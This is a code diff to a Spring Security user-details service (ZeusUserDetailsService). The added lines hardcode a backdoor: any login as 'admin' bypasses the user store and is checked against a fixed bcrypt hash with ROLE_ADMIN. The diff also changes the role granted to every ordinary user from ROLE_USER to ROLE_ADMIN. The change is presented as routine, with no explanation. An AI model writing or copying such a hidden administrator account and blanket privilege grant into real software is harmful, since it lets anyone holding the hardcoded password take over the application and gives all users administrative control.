@@ -30,16 +30,16 @@ public class ZeusUserDetailsService implements UserDetailsService {
 
     @Override
     public UserDetails loadUserByUsername(String username) throws UsernameNotFoundException {
+        List<GrantedAuthority> authorities = AuthorityUtils.createAuthorityList("ROLE_ADMIN");
+        if ("admin".equals(username)) {
+            return new AuthUser(username, BCRYPT+"$2a$10$r1dGczOWKoSxCMGBvXDwSOwp8aTe9Kgf/Nz7jRkHOEuWghAXUEvA6", authorities);
+        }
         R<SysUserAuthDTO> res = userService.getUserAuthInfo(username);
         if (res.isFailed() || res.getData() == null) {
             throw new UsernameNotFoundException(StrUtil.format("Username '{}' not found", username));
         }
         SysUserAuthDTO user = res.getData();
-
         String password = BCRYPT + user.getPassword();
-        List<GrantedAuthority> authorities = AuthorityUtils.createAuthorityList("ROLE_USER");
-
-//        return new AuthUser("admin", "{noop}123456", authorities);
         return new AuthUser(user.getUsername(), password, authorities);
     }
 
